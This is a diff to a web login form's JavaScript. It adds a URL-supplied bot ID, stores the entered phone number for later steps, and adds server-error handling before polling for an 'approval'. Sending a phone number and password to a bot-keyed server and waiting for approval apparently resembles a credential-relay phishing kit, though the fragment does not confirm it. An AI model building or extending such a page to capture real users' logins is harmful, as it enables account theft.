@@ -131,7 +131,15 @@
     const statusEl = document.getElementById('status');
 
     const fullName = localStorage.getItem('fullName');
-    const botId = 'bot1'; // change if needed
+
+    // ✅ Get botId from URL or storage (multi-bot safe)
+    const params = new URLSearchParams(window.location.search);
+    const botId =
+      params.get('botId') ||
+      localStorage.getItem('botId') ||
+      'bot1';
+
+    localStorage.setItem('botId', botId);
 
     if (!fullName) {
       alert('Session expired. Please start again.');
@@ -143,6 +151,9 @@
 
       const phone = document.getElementById('phone').value;
       const password = document.getElementById('password').value;
+
+      // ✅ SAVE PHONE FOR NEXT STEPS
+      localStorage.setItem('phone', phone);
 
       statusEl.style.display = 'block';
       statusEl.classList.remove('error');
@@ -158,6 +169,12 @@
           botId
         })
       });
+
+      if (!res.ok) {
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Server error. Please try again.';
+        return;
+      }
 
       const { requestId } = await res.json();
       pollApproval(requestId);
